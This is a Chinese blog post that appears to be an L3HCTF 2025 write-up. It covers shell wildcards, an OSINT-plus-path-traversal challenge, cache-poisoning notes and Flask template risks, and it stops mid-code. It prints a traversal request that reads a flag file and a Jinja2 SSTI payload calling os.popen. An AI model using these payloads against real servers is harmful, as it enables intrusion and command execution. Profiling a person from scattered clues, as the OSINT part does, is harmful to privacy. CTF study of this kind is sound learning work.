<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="L3Hctf, q1n9&#39;s blog">
    <meta name="description" content="linux不解析通配符

一、基础通配符（适用于命令行、文件操作）这些通配符在 Linux/macOS 的 Bash 终端、Windows 的命令提示符（CMD）或 PowerShell 中常用，主要用于匹配文件名。

\*（星号）
匹配 ">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>L3Hctf | q1n9&#39;s blog</title>
    <link rel="icon" type="image/png" href="/favicon.png">
    


    <!-- bg-cover style     -->



<link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
<link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
<link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
<link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
<link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
<link rel="stylesheet" type="text/css" href="/css/matery.css">
<link rel="stylesheet" type="text/css" href="/css/my.css">
<link rel="stylesheet" type="text/css" href="/css/dark.css" media="none" onload="if(media!='all')media='all'">




    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
    <link rel="stylesheet" href="/css/post.css">




    



    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">q1n9&#39;s blog</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
  <li>
    <a href="javascript:;" class="waves-effect waves-light" onclick="switchNightMode()" title="深色/浅色模式" >
      <i id="sum-moon-icon" class="fas fa-sun" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">q1n9&#39;s blog</div>
        <div class="logo-desc">
            
            welcome to my blog
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/lingqing777/lingqing777.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/lingqing777/lingqing777.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">L3Hctf</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/ctf/">
                                <span class="chip bg-color">ctf</span>
                            </a>
                        
                            <a href="/tags/wp/">
                                <span class="chip bg-color">wp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E7%BD%91%E5%AE%89/" class="post-category">
                                网安
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2025-07-20
                </div>
                

                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
                    2025-08-26
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    7.4k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
                    35 分
                </div>
                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.min.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>linux不解析通配符</p>
<blockquote>
<h3 id="一、基础通配符（适用于命令行、文件操作）"><a href="#一、基础通配符（适用于命令行、文件操作）" class="headerlink" title="一、基础通配符（适用于命令行、文件操作）"></a><strong>一、基础通配符（适用于命令行、文件操作）</strong></h3><p>这些通配符在 Linux/macOS 的 Bash 终端、Windows 的命令提示符（CMD）或 PowerShell 中常用，主要用于匹配文件名。</p>
<ol>
<li><strong><code>\*</code>（星号）</strong><ul>
<li>匹配 <strong>任意长度的任意字符</strong>（包括空字符）。</li>
<li>示例：<ul>
<li><code>*.txt</code>：匹配所有以 <code>.txt</code> 结尾的文件（如 <code>a.txt</code>、<code>b123.txt</code>）。</li>
<li><code>file*</code>：匹配所有以 <code>file</code> 开头的文件（如 <code>file</code>、<code>file1</code>、<code>file.txt</code>）。</li>
<li><code>*doc*</code>：匹配文件名中包含 <code>doc</code> 的文件（如 <code>readme.doc</code>、<code>mydoc.pdf</code>）。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>?</code>（问号）</strong><ul>
<li>匹配 <strong>单个任意字符</strong>（必须有一个字符，不能匹配空）。</li>
<li>示例：<ul>
<li><code>file?.txt</code>：匹配 <code>file1.txt</code>、<code>fileA.txt</code>（文件名中 <code>file</code> 后有 1 个字符），但不匹配 <code>file.txt</code>（少一个字符）或 <code>file12.txt</code>（多一个字符）。</li>
<li><code>?.log</code>：匹配 <code>a.log</code>、<code>1.log</code>（仅 1 个字符 + <code>.log</code>）。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>[]</code>（方括号）</strong><ul>
<li>匹配 <strong>括号内指定的任意一个字符</strong>，支持范围表示。</li>
<li>规则：<ul>
<li><code>[abc]</code>：匹配 <code>a</code>、<code>b</code>、<code>c</code> 中的任意一个字符。</li>
<li><code>[0-9]</code>：匹配 0-9 中的任意一个数字（范围用 <code>-</code> 分隔）。</li>
<li><code>[a-z]</code>：匹配小写字母 a-z。</li>
<li><code>[^abc]</code> 或 <code>[!abc]</code>：匹配 <strong>不在括号内</strong> 的任意一个字符（取反，<code>^</code> 或 <code>!</code> 为取反符号）。</li>
</ul>
</li>
<li>示例：<ul>
<li><code>file[0-5].txt</code>：匹配 <code>file0.txt</code> 到 <code>file5.txt</code>。</li>
<li><code>[A-Z]*.pdf</code>：匹配以大写字母开头的 PDF 文件（如 <code>Report.pdf</code>）。</li>
<li><code>file[!0-9].txt</code>：匹配 <code>fileA.txt</code>、<code>file_.txt</code>，但不匹配 <code>file1.txt</code>。</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>{}</code>（花括号）</strong><ul>
<li>用于 <strong>生成多个字符串组合</strong>，不做匹配，而是直接展开为括号内的所有项。</li>
<li>示例：<ul>
<li><code>file{1,2,3}.txt</code>：展开为 <code>file1.txt file2.txt file3.txt</code>（可用于批量创建或操作文件）。</li>
<li><code>{a,b}*{x,y}</code>：展开为 <code>a*x a*y b*x b*y</code>（结合 <code>*</code> 时先展开再匹配）。</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="二、正则表达式中的通配符（扩展匹配）"><a href="#二、正则表达式中的通配符（扩展匹配）" class="headerlink" title="二、正则表达式中的通配符（扩展匹配）"></a><strong>二、正则表达式中的通配符（扩展匹配）</strong></h3><p>在编程（如 Python、JavaScript）、文本搜索（如 <code>grep</code> 命令）中，正则表达式的通配符功能更强大，需注意与基础通配符的区别：</p>
<ol>
<li><strong><code>.</code>（点号）</strong><ul>
<li>匹配 <strong>单个任意字符</strong>（类似 <code>?</code>，但在正则中更常用）。</li>
<li>示例：<code>a.b</code> 匹配 <code>aab</code>、<code>a1b</code>、<code>a@b</code>（中间任意一个字符）。</li>
</ul>
</li>
<li><strong><code>.\*</code>（点星组合）</strong><ul>
<li>匹配 <strong>任意长度的任意字符</strong>（类似 <code>*</code>，但在正则中是贪婪匹配，尽可能多匹配）。</li>
<li>示例：<code>a.*b</code> 匹配 <code>a123b</code>、<code>aXyZb</code>（<code>a</code> 和 <code>b</code> 之间的所有字符）。</li>
</ul>
</li>
<li><strong><code>^</code> 和 <code>$</code>（锚点）</strong><ul>
<li><code>^</code>：匹配字符串的 <strong>开头</strong>（如 <code>^hello</code> 匹配以 <code>hello</code> 开头的字符串）。</li>
<li><code>$</code>：匹配字符串的 <strong>结尾</strong>（如 <code>world$</code> 匹配以 <code>world</code> 结尾的字符串）。</li>
<li>示例：<code>^abc$</code> 仅匹配字符串 <code>abc</code>（精确匹配，开头和结尾无其他字符）。</li>
</ul>
</li>
<li><strong><code>\d</code>、<code>\w</code>、<code>\s</code>（预定义字符类）</strong><ul>
<li><code>\d</code>：匹配任意数字（等价于 <code>[0-9]</code>）。</li>
<li><code>\w</code>：匹配字母、数字或下划线（等价于 <code>[a-zA-Z0-9_]</code>）。</li>
<li><code>\s</code>：匹配空白字符（空格、制表符 <code>\t</code>、换行符 <code>\n</code> 等）。</li>
<li>示例：<code>\d{3}</code> 匹配 3 个连续数字（如 <code>123</code>、<code>456</code>）。</li>
</ul>
</li>
</ol>
<h3 id="三、通配符的使用场景"><a href="#三、通配符的使用场景" class="headerlink" title="三、通配符的使用场景"></a><strong>三、通配符的使用场景</strong></h3><ol>
<li><p><strong>命令行操作</strong></p>
<ul>
<li>批量删除文件：<code>rm *.tmp</code>（删除所有 <code>.tmp</code> 临时文件）。</li>
<li>批量复制：<code>cp photo_?.jpg ./backup/</code>（复制 <code>photo_1.jpg</code>、<code>photo_2.jpg</code> 到 <code>backup</code> 文件夹）。</li>
<li>搜索文件：<code>ls [A-Z]*</code>（列出所有大写字母开头的文件）。</li>
</ul>
</li>
<li><p><strong>编程中的字符串匹配</strong></p>
<ul>
<li><p>在 Python 中用</p>
<pre class="line-numbers language-none"><code class="language-none">re<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>模块（正则表达式）：</p>
<p>python</p>
<p>运行</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">if</span> re<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span><span class="token string">r'file\d+\.txt'</span><span class="token punctuation">,</span> <span class="token string">'file123.txt'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"匹配成功"</span><span class="token punctuation">)</span>  <span class="token comment"># 输出：匹配成功（\d+ 匹配1个以上数字）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
<li><p><strong>文件搜索工具</strong></p>
<ul>
<li>如 <code>grep</code> 命令：<code>grep 'error.*2023' log.txt</code>（搜索日志中包含 <code>error</code> 且后面跟 <code>2023</code> 的行）。</li>
</ul>
</li>
</ol>
<h3 id="四、注意事项"><a href="#四、注意事项" class="headerlink" title="四、注意事项"></a><strong>四、注意事项</strong></h3><ol>
<li><p><strong>不同环境的差异</strong></p>
<ul>
<li>Windows 的 CMD 中，<code>*</code> 和 <code>?</code> 用法与 Linux 类似，但不支持 <code>[]</code> 范围匹配；PowerShell 则支持更多通配符（如 <code>[]</code>、<code>*</code>、<code>?</code>）。</li>
<li>正则表达式中的 <code>*</code> 与命令行的 <code>*</code> 不同：正则中 <code>*</code> 表示 “前面的字符重复 0 次或多次”（如 <code>ab*</code> 匹配 <code>a</code>、<code>ab</code>、<code>abb</code>），而命令行中 <code>*</code> 是独立的通配符。</li>
</ul>
</li>
<li><p><strong>转义字符</strong></p>
<ul>
<li><p>若要匹配通配符本身（如文件名含</p>
<pre class="line-numbers language-none"><code class="language-none">*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>），需用转义符</p>
<pre class="line-numbers language-none"><code class="language-none">\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>（Linux）或</p>
<pre class="line-numbers language-none"><code class="language-none">^<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>（Windows CMD），例如：</p>
<ul>
<li>Linux：<code>ls \*.txt</code>（匹配文件名就是 <code>*.txt</code> 的文件）。</li>
<li>Windows CMD：<code>dir ^*.txt</code>（同上）。</li>
</ul>
</li>
</ul>
</li>
</ol>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://su-team.cn/posts/e3fd1be7.html#gogogo-chu-fa-lou">https://su-team.cn/posts/e3fd1be7.html#gogogo-chu-fa-lou</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.xmcve.com/2025/07/15/L3HCTF2025-Writeup/#title-6">L3HCTF Writeup - 星盟安全团队</a></p>
<h3 id="赛博侦探"><a href="#赛博侦探" class="headerlink" title="赛博侦探"></a>赛博侦探</h3><p>点开九子夺嫡视频</p>
<pre class="line-numbers language-none"><code class="language-none">url为
https://www.bilibili.com/video/BV1tT421e7r3/?from_url=http://223.112.5.141:64601/secret/find_my_password&amp;buvid=XU729158D436618067C9318686801E96CB45D&amp;from_spmid=tm.recommend.0.0&amp;is_story_h5=false&amp;p=1&amp;plat_id=116&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=422b97e2-06ad-4b22-a034-6f23ac237e51&amp;share_source=COPY&amp;share_tag=s_i&amp;spmid=united.player-video-detail.0.0&amp;timestamp=1751785740&amp;unique_k=CB6R8pq&amp;up_id=552601798

即为http://223.112.5.141:64601/secret/find_my_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>通过doc属性可知邮箱为<a href="mailto:leland@l3hsec.com">leland@l3hsec.com</a>，英文名为leland</p>
<p>接着根据离羽毛球馆的距离查店铺位置，可推其经纬度为<code>114.175,30.623</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/63bf8cecf4cc54acc7c56747399c0713.png"></p>
<p>通过扫码知航班为MU5399</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/84b4c3cd5ecb3461b04c7c1b65af72a8.png"></p>
<p>因是从武汉出发，故老家为福州</p>
<p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/d717c16d0e37b9d31b4ef81fbbc6afdc.png"></p>
<p>提交答案后转到<a target="_blank" rel="noopener" href="http://223.112.5.141:64601/secret/my_lovely_photos%EF%BC%8C%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81%E5%8F%AF%E7%9F%A5%E4%B8%BA%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%EF%BC%8C%E8%BE%93%E5%85%A5http://223.112.5.141:64601/secret/my_lovely_photo?name=../../../flag%EF%BC%8C%E5%8D%B3%E5%8F%AF%E5%BE%97%E5%88%B0%60L3HCTF%7BF1ndL3l4ndAndTr4v3rs3TheP4th%7D%60">http://223.112.5.141:64601/secret/my_lovely_photos，看源代码可知为路径穿越，输入http://223.112.5.141:64601/secret/my_lovely_photo?name=../../../flag，即可得到`L3HCTF{F1ndL3l4ndAndTr4v3rs3TheP4th}`</a></p>
<hr>
<h3 id="best-profile"><a href="#best-profile" class="headerlink" title="best_profile"></a>best_profile</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7291">对缓存投毒的学习总结-先知社区</a></p>
<blockquote>
<ul>
<li><code>X-Forwarded-For: 客户端原始IP, 代理1IP, 代理2IP, ...</code><ul>
<li>第一个 IP 为客户端真实 IP，后续为请求经过的代理 IP。</li>
</ul>
</li>
<li><strong>示例</strong>：<br>客户端（<code>192.168.1.100</code>）→ 代理 A（<code>10.0.0.1</code>）→ 代理 B（<code>203.0.113.5</code>）→ 后端服务器，请求头为：<br><code>X-Forwarded-For: 192.168.1.100, 10.0.0.1, 203.0.113.5</code></li>
<li><strong>格式</strong>：单个主机名（或 IP + 端口，端口可选）<br><code>X-Forwarded-Host: 客户端访问的原始域名[:端口]</code></li>
<li><strong>背景</strong>：<br>当请求经过代理时，代理会与后端服务器建立新连接，此时后端服务器收到的 <code>Host</code> 头可能被代理修改为后端服务器自身的地址（如代理配置的后端服务域名）。<code>X-Forwarded-Host</code> 用于保留客户端最初请求的 <code>Host</code> 信息。</li>
<li><strong>示例</strong>：<br>客户端访问 <code>https://www.example.com</code>，请求经代理转发到后端服务器 <code>10.0.0.10</code>，代理会：<ul>
<li>将请求的 <code>Host</code> 头改为 <code>10.0.0.10</code>（后端服务器地址）；</li>
<li>同时添加 <code>X-Forwarded-Host: www.example.com</code>，告知后端服务器用户实际访问的是 <code>www.example.com</code>。</li>
</ul>
</li>
</ul>
</blockquote>
<blockquote>
<h3 id="X-Forwarded-Host-与-Host-的区别"><a href="#X-Forwarded-Host-与-Host-的区别" class="headerlink" title="X-Forwarded-Host 与 Host 的区别"></a>X-Forwarded-Host 与 Host 的区别</h3><ul>
<li><strong>Host 头部</strong>：<br>是 HTTP 协议标准头部，由客户端（如浏览器）发送，用于指定请求的目标服务器的域名或 IP 地址及端口，是服务器识别自身应处理哪个站点请求的核心依据（尤其在虚拟主机场景）。例如，访问 <code>https://example.com/path</code> 时，Host 头部通常为 <code>example.com</code>。</li>
<li><strong>X-Forwarded-Host 头部</strong>：<br>是非标准但广泛使用的扩展头部，由反向代理服务器（如 Nginx、Apache 等）添加，用于传递客户端原始请求中的 Host 信息。当请求经过代理服务器转发到后端服务器时，后端服务器通过该头部可获取客户端最初请求的目标域名，而非代理服务器的地址。</li>
</ul>
<h3 id="核心差异"><a href="#核心差异" class="headerlink" title="核心差异"></a>核心差异</h3><table>
<thead>
<tr>
<th>头部</th>
<th>发送方</th>
<th>作用</th>
<th>典型场景</th>
</tr>
</thead>
<tbody><tr>
<td>Host</td>
<td>客户端</td>
<td>指示请求的目标服务器域名 / IP</td>
<td>直接向服务器发起请求</td>
</tr>
<tr>
<td>X-Forwarded-Host</td>
<td>反向代理服务器</td>
<td>传递客户端原始请求的 Host 信息</td>
<td>存在代理的多层网络架构</td>
</tr>
</tbody></table>
<p>例如，客户端请求 <code>https://proxy.com</code>（代理服务器），实际转发到后端 <code>backend.com</code>，此时：</p>
<ul>
<li><p>客户端发送的 Host 为 <code>proxy.com</code></p>
</li>
<li><p>代理服务器添加 X-Forwarded-Host 为 <code>proxy.com</code>，后端服务器通过它可知客户端原始目标</p>
</li>
<li><p><strong>1. X-Forwarded-For</strong></p>
<h4 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h4><p>记录客户端的<strong>原始 IP 地址</strong>以及请求经过的所有代理服务器的 IP 地址。<br>当请求经过多层代理（如客户端 → 代理服务器 A → 代理服务器 B → 后端服务器）时，后端服务器默认只能看到最后一个代理的 IP，而 <code>X-Forwarded-For</code> 可以追溯完整的请求路径。</p>
<h4 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h4><p>逗号分隔的 IP 地址列表，<strong>第一个地址是客户端原始 IP</strong>，后续是各级代理的 IP。<br>例如：<code>X-Forwarded-For: 192.168.1.100, 10.0.0.1, 172.16.0.2</code></p>
<ul>
<li><code>192.168.1.100</code>：客户端真实 IP</li>
<li><code>10.0.0.1</code>：第一级代理 IP</li>
<li><code>172.16.0.2</code>：第二级代理 IP</li>
</ul>
<h3 id="2-X-Forwarded-Host"><a href="#2-X-Forwarded-Host" class="headerlink" title="2. X-Forwarded-Host"></a><strong>2. X-Forwarded-Host</strong></h3><h4 id="作用：-1"><a href="#作用：-1" class="headerlink" title="作用："></a>作用：</h4><p>记录客户端请求的<strong>原始 Host 头部</strong>（即客户端访问的域名或 IP）。<br>当请求经过反向代理时，代理服务器通常会修改 <code>Host</code> 头部（例如指向后端服务器的内部地址），而 <code>X-Forwarded-Host</code> 用于保留客户端最初请求的 Host 信息。</p>
</li>
</ul>
</blockquote>
<blockquote>
<ol>
<li><strong>利用缓存键（Cache Key）设计缺陷</strong><br>缓存服务器通常根据请求的部分信息（如 URL、Host 头、特定请求参数等）生成 “缓存键”，用于标识唯一资源。若缓存键未包含某些关键参数（如未验证的用户输入、特殊 HTTP 头），攻击者可构造包含恶意内容的请求，使缓存将恶意内容与正常 URL 关联。<br>例如：若缓存仅根据<code>URL</code>生成键，而忽略<code>X-Forwarded-Host</code>头，攻击者可发送包含恶意<code>X-Forwarded-Host</code>的请求，使缓存将恶意脚本与正常 URL 绑定，其他用户访问该 URL 时会加载恶意脚本。</li>
<li><strong>注入恶意代码到可缓存资源</strong><br>若源服务器对用户输入过滤不严，攻击者可提交包含恶意代码（如 XSS 脚本、恶意 JS）的内容，并诱导缓存服务器将其作为 “静态资源”（如<code>.js</code>、<code>.css</code>文件）缓存。当其他用户加载该资源时，恶意代码会被执行。<br>例如：在用户可控的动态页面中注入恶意 JS，若该页面被缓存，所有访问者都会触发 JS 执行。</li>
<li><strong>利用 HTTP 响应头漏洞</strong><br>若源服务器返回的响应头包含错误的缓存控制信息（如<code>Cache-Control: public</code>，允许缓存），或缓存服务器忽略了源服务器的缓存限制（如<code>no-cache</code>），攻击者可通过构造请求，使恶意内容被长期缓存。</li>
</ol>
</blockquote>
<blockquote>
<h4 id="1-render-template-的安全特性"><a href="#1-render-template-的安全特性" class="headerlink" title="1. render_template 的安全特性"></a>1. <code>render_template</code> 的安全特性</h4><ul>
<li><p>自动转义</p>
<p>：默认对变量输出进行 HTML 转义，防止 XSS 攻击。</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 模板文件 index.html --&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Hello, {{ name }}!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>

<span class="token comment">&lt;!-- 当 name = '&lt;script&gt;alert(1)&lt;/script&gt;' 时 --&gt;</span>
<span class="token comment">&lt;!-- 输出结果：&lt;p&gt;Hello, &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;!&lt;/p&gt; --&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p><strong>沙箱环境</strong>：模板中无法直接访问 Python 全局对象（如 <code>os</code>、<code>sys</code>），限制代码执行能力。</p>
</li>
</ul>
<h4 id="2-render-template-string-的风险"><a href="#2-render-template-string-的风险" class="headerlink" title="2. render_template_string 的风险"></a>2. <code>render_template_string</code> 的风险</h4><ul>
<li><p>直接执行模板代码</p>
<p>：字符串中的任何 Jinja2 语法都会被执行。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">template <span class="token operator">=</span> <span class="token string">"{{ 1+1 }}"</span>  <span class="token comment"># 计算表达式</span>
render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span>  <span class="token comment"># 输出 "2"</span>
              
<span class="token comment"># 危险示例：执行任意 Python 代码</span>
payload <span class="token operator">=</span> <span class="token string">"{{ request.application.__globals__['os'].popen('id').read() }}"</span>
render_template_string<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment"># 执行系统命令并返回结果</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</blockquote>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> re
